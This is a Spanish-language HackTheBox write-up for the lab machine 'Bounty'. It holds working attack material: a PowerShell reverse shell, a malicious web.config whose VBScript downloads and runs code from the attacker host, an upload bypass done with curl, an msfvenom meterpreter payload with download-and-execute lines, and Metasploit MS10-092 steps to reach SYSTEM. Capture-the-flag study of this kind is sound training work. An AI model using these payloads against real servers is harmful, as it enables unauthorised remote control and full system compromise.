---
title: "🏴 Bounty — HackTheBox Writeup"
machine: "Bounty"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
tags: ["RCE", "Upload", "Privesc", "Web", "PowerShell"]
retired: true
summary: "- Puerto 80 abierto — Microsoft IIS httpd 7.5"
draft: false
---
**OS:** Windows Server 2008 R2 Datacenter
**Difficulty:** Easy
**IP:** 10.129.34.207

---

# indice

## Reconocimiento

### Nmap

```bash
sudo nmap 10.129.34.207 -p 80 -sCV -Pn -oN targeted
```

**Resultados:**

- Puerto 80 abierto — Microsoft IIS httpd 7.5
- OS: Windows
- Método TRACE habilitado (potencialmente riesgoso)

La página principal solo muestra una imagen (`merlin.jpg`). Nada explotable a simple vista.

---

## Enumeración

### Gobuster — Directorios

```bash
gobuster dir -u http://10.129.34.207 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40
```

**Resultados relevantes:**

- `/uploadedfiles/` — directorio donde se almacenan archivos subidos
- `/aspnet_client/` — directorio estándar de IIS

### Gobuster — Archivos

```bash
gobuster dir -u http://10.129.34.207 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x asp,aspx -t 40
```

**Resultados relevantes:**

- `/transfer.aspx` — formulario de subida de archivos

---

## Explotación — RCE via web.config

### Concepto

IIS 7.5 ejecuta archivos `web.config` como código ASP. Si el servidor permite subir un `.config`, podemos embeber código VBScript malicioso que se ejecutará al visitar la URL del archivo.

El formulario en `/transfer.aspx` permite subir archivos `.config` a pesar de las restricciones aparentes.

### Paso 1 — Crear shell.ps1

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.17.74',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Paso 2 — Crear web.config malicioso

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config" /></fileExtensions>
            <hiddenSegments><remove segment="web.config" /></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings></appSettings>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.17.74:8080/shell.ps1')"
Set objShellExec = objShell.Exec(strCommand)
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.Write(strOutput)
WScript.Echo(strOutput)
%>
```

### Paso 3 — Levantar infraestructura

```bash
# Terminal 1 — Servidor HTTP para entregar shell.ps1
python3 -m http.server 8080

# Terminal 2 — Listener
nc -lvnp 4444
```

### Paso 4 — Subir y ejecutar

```bash
# Obtener tokens del formulario
curl -s http://10.129.34.207/transfer.aspx -c cookies.txt > /tmp/form.html
VIEWSTATE=$(grep -oP '__VIEWSTATE.*?value="\K[^"]+' /tmp/form.html)
EVENTVAL=$(grep -oP '__EVENTVALIDATION.*?value="\K[^"]+' /tmp/form.html)

# Subir web.config
curl -b cookies.txt \
     -F "__VIEWSTATE=$VIEWSTATE" \
     -F "__EVENTVALIDATION=$EVENTVAL" \
     -F "FileUpload1=@web.config;type=text/plain" \
     -F "btnUpload=Upload" \
     http://10.129.34.207/transfer.aspx

# Disparar ejecución
curl http://10.129.34.207/uploadedfiles/web.config
```

**Resultado:** Shell como `BOUNTY\merlin`

---

## User Flag

```powershell
type C:\Users\merlin\Desktop\user.txt
```

---

## Escalada de Privilegios

### Contexto

```
OS: Windows Server 2008 R2 Datacenter — Build 7600
Hotfixes: N/A (ningún parche aplicado)
Privilegio clave: SeImpersonatePrivilege — Enabled
```

El sistema no tiene ningún parche aplicado, lo que lo hace vulnerable a múltiples exploits de kernel.

### Migrar a Meterpreter

```bash
# Generar payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.74 LPORT=6666 -f exe -o scheduler.exe
```

Actualizar `shell.ps1` para descargar y ejecutar el payload:

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.17.74:8080/scheduler.exe','C:\Windows\Tasks\scheduler.exe')
Start-Process 'C:\Windows\Tasks\scheduler.exe'
```

```bash
# Handler en Metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.17.74
set LPORT 6666
run
```

Re-subir y ejecutar `web.config` → Meterpreter session como `BOUNTY\merlin`.

### Exploit — MS10-092 (Schelevator)

```bash
background

use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST 10.10.17.74
set LPORT 7777
set ForceExploit true
run
```

**Resultado:** Shell como `NT AUTHORITY\SYSTEM`

---

## Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

## Resumen

| Fase | Técnica |
| --- | --- |
| Reconocimiento | Nmap, Gobuster |
| Foothold | web.config RCE via file upload bypass |
| Lateral | PowerShell reverse shell → Meterpreter |
| Privesc | MS10-092 Schelevator (sin parches) |
| Resultado | NT AUTHORITY\SYSTEM |

### Lecciones Aprendidas

- IIS 7.5 procesa `web.config` como código ASP — un upload aparentemente inofensivo puede ser RCE
- Los formularios de upload con VIEWSTATE requieren los tokens correctos para funcionar
- `C:\Windows\Tasks` es un directorio escribible útil cuando `Temp` da problemas de permisos
- Windows Server 2008 R2 sin parches es extremadamente vulnerable a exploits de kernel

Writeup por **4Pr3nd1z _____mayo 2026**
